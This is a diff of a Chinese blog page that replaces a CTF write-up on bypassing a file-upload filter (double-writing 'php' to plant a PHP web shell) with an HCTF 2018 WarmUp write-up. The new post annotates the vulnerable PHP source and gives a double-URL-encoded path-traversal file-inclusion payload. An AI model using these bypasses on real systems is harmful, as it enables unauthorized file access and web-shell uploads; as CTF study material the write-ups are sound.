@@ -18,7 +18,7 @@
   <meta name="author" content="Alone">
   <meta name="keywords" content="">
   
-  <title>文件上传-双写绕过 - Alone 的博客</title>
+  <title>HCTF 2018WarmUp - Alone 的博客</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -163,7 +163,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="文件上传-双写绕过">
+            <span class="h2" id="subtitle" title="HCTF 2018WarmUp">
               
             </span>
 
@@ -178,8 +178,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-09-08 20:01" pubdate>
-        September 8, 2021 pm
+      <time datetime="2021-12-03 13:01" pubdate>
+        December 3, 2021 pm
       </time>
     </span>
   
@@ -190,7 +190,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      132 字
+      919 字
     </span>
   
 
@@ -200,7 +200,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1
+      14
        分钟
     </span>
   
@@ -238,31 +238,12 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">文件上传-双写绕过</h1>
+            <h1 style="display: none">HCTF 2018WarmUp</h1>
             
             <div class="markdown-body">
-              <h1 id="打开题目"><a href="#打开题目" class="headerlink" title="打开题目"></a>打开题目</h1><blockquote>
-<p>文件上传 上传一个php一句话。</p>
-<blockquote>
-<p><img src="https://i.loli.net/2021/09/08/EDpxAwdFQTL6jKc.png" srcset="/img/loading2.gif" lazyload alt="ヽ(ー_ー)ノ"><br>发现上传之后后缀php被过滤。</p>
-</blockquote>
-</blockquote>
-<hr>
-<blockquote>
-<p>题目为双写绕过，写两次phpphp照样被过滤，写为pphphp过滤了中间一个php剩下字母拼成一个。</p>
-<blockquote>
-<p><img src="https://i.loli.net/2021/09/08/sOZGKW5pXxM6wLR.png" srcset="/img/loading2.gif" lazyload alt="ヽ(ー_ー)ノ"><br>上传成功，显示pass.php。<br><img src="https://i.loli.net/2021/09/08/qJNo8hOdmpU5gw9.png" srcset="/img/loading2.gif" lazyload alt="ヽ(ー_ー)ノ"></p>
-</blockquote>
-</blockquote>
-<h1 id="工具链接"><a href="#工具链接" class="headerlink" title="工具链接"></a>工具链接</h1><blockquote>
-<p>输入文件地址 密码链接成功。</p>
-<blockquote>
-<p><img src="https://i.loli.net/2021/09/08/Xknez84PcvtRUOr.png" srcset="/img/loading2.gif" lazyload alt="ヽ(ー_ー)ノ"><br>找到flag文件<br><img src="https://i.loli.net/2021/09/08/2fC3L7txyeWwvbH.png" srcset="/img/loading2.gif" lazyload alt="ヽ(ー_ー)ノ"><br>成功找到！！</p>
-</blockquote>
-</blockquote>
-<blockquote>
-<p>考察文件上传漏洞，双写绕过，重复写后缀名，自动过滤一个还剩下一个保证文件格式完整。</p>
-</blockquote>
+              <p>查看源码，发现source.php访问。<br>得到代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs php"><br> <span class="hljs-meta">&lt;?php</span><br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>) </span><br><span class="hljs-function">        //传入了变量<span class="hljs-title">page</span>，也就是我们刚刚传进来的<span class="hljs-title">file</span></span><br><span class="hljs-function">        </span>&#123;<br>        	<span class="hljs-comment">// 这里定义了白名单</span><br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !is_string(<span class="hljs-variable">$page</span>)) &#123;<br>            <span class="hljs-comment">/*为了返回 true 两个条件必须满足</span><br><span class="hljs-comment">            	1 page存在 </span><br><span class="hljs-comment">            	2 page是字符串 ，</span><br><span class="hljs-comment">            	这里和外层的判断file 一致基本是再次判断了一遍*/</span><br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>			<span class="hljs-comment">/*in_array(search,array,type) 函数搜索数组中是否存在指定的值，</span><br><span class="hljs-comment">			白名单过滤，需要返回了ture</span><br><span class="hljs-comment">			所以这里我们传入的page或者是经过截断之后的page必须是soure.php或hint.php，</span><br><span class="hljs-comment">			这里是正常的访问，我们需要构造文件任意包含，所以这里传入的不满足条件，这里不是注意的点，往下继续看*/</span><br>            <span class="hljs-variable">$_page</span> = mb_substr( <br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>,  <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>			<span class="hljs-comment">/*这里mb_sustr 是个截断，返回0到mb_strpos之间的内容，而mb_strps 则是查找第一次出现的位置，所以基本可以理解为获取page 两个？之间的字符串，也就是获取file两个？之间的字符串，放到url中就是http://ip/?file=ddd?中的file=ddd*/</span>            <br>            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123; <br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-comment">//这里和上面类似 查看_page 是否在白名单中</span><br>            <span class="hljs-variable">$_page</span> = urldecode(<span class="hljs-variable">$page</span>); <span class="hljs-comment">// 这里发现对_page进行了一次decode解码，</span><br>            <span class="hljs-variable">$_page</span> = mb_substr(<span class="hljs-comment">//获取两个？？之间的内容</span><br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-comment">// 这里是我们要绕过的点，从这里往上看 尝试构造</span><br>            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<span class="hljs-comment">//白名单</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; is_string(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::checkFile(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;<br>	<span class="hljs-comment">/*必须满足if条件，才能包含file，这里也可以猜到可能考的是文件包含： </span><br><span class="hljs-comment">		1 REQUEST[&#x27;file&#x27;]不为空 </span><br><span class="hljs-comment">		2 REQUEST[&#x27;file&#x27;]是字符串 </span><br><span class="hljs-comment">		3 checkFile($_REQUEST[&#x27;file&#x27;]) 为ture，回到checkFile 函数分析如何返回true*/</span>    <br><span class="hljs-meta">?&gt;</span><br><br>可以看到函数代码中有四个<span class="hljs-keyword">if</span>语句<br>第一个<span class="hljs-keyword">if</span>语句对变量进行检验，要求<span class="hljs-variable">$page</span>为字符串，否则返回<span class="hljs-literal">false</span><br>第二个<span class="hljs-keyword">if</span>语句判断<span class="hljs-variable">$page</span>是否存在于<span class="hljs-variable">$whitelist</span>数组中，存在则返回<span class="hljs-literal">true</span><br>第三个<span class="hljs-keyword">if</span>语句判断截取后的<span class="hljs-variable">$page</span>是否存在于<span class="hljs-variable">$whitelist</span>数组中，截取<span class="hljs-variable">$page</span>中<span class="hljs-string">&#x27;?&#x27;</span>前部分，存在则返回<span class="hljs-literal">true</span><br>第四个<span class="hljs-keyword">if</span>语句判断url解码并截取后的<span class="hljs-variable">$page</span>是否存在于<span class="hljs-variable">$whitelist</span>中，存在则返回<span class="hljs-literal">true</span><br>若以上四个<span class="hljs-keyword">if</span>语句均未返回值，则返回<span class="hljs-literal">false</span><br>有三个<span class="hljs-keyword">if</span>语句可以返回<span class="hljs-literal">true</span>，第二个语句直接判断<span class="hljs-variable">$page</span>，不可用<br>第三个语句截取<span class="hljs-string">&#x27;?&#x27;</span>前部分，由于?被后部分被解析为get方式提交的参数，也不可利用<br>第四个<span class="hljs-keyword">if</span>语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为<span class="hljs-string">&#x27;?&#x27;</span>，仍可通过第四个<span class="hljs-keyword">if</span>语句校验。（<span class="hljs-string">&#x27;?&#x27;</span>两次编码值为<span class="hljs-string">&#x27;%253f&#x27;</span>）,构造url：<br>所以我们的payload 就是<br><br>file=source.php?file=source.php%<span class="hljs-number">253</span>f../ffffllllaaaagggg构建一级目录没反应，两级也没反应，猜测可能是文件目录层级问题，继续添加../目录层级最终得到。<br>file=source.php?file=source.php%<span class="hljs-number">253</span>f../../../../../ffffllllaaaagggg<br><br></code></pre></td></tr></table></figure>
+<p>尝试访问hint.php<br><img src="https://pic.imgdb.cn/item/61aa4fda2ab3f51d91c6c6c7.jpg" srcset="/img/loading2.gif" lazyload><br>尝试构造访问，进行绕过。<br><img src="https://pic.imgdb.cn/item/61aa50132ab3f51d91c6e77b.jpg" srcset="/img/loading2.gif" lazyload></p>
 
             </div>
             <hr>
@@ -272,7 +253,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/CTFHUB/">CTFHUB</a>
+                      <a class="hover-with-bg" href="/categories/BUU/">BUU</a>
                     
                   </div>
                 
@@ -297,9 +278,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/09/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A00x00/">
+                      <a href="/2021/12/03/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHavefun/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">文件上传-%00绕过</span>
+                        <span class="hidden-mobile">极客大挑战 2019Havefun</span>
                         <span class="visible-mobile">Vorheriger</span>
                       </a>
                     
@@ -307,8 +288,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/09/08/%E5%A2%A8%E8%80%85%20X-Forwarded-For%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/">
-                        <span class="hidden-mobile">X-Forwarded-For注入漏洞实战</span>
+                      <a href="/2021/11/23/hello-world/">
+                        <span class="hidden-mobile">Hello World</span>
                         <span class="visible-mobile">Nächster</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
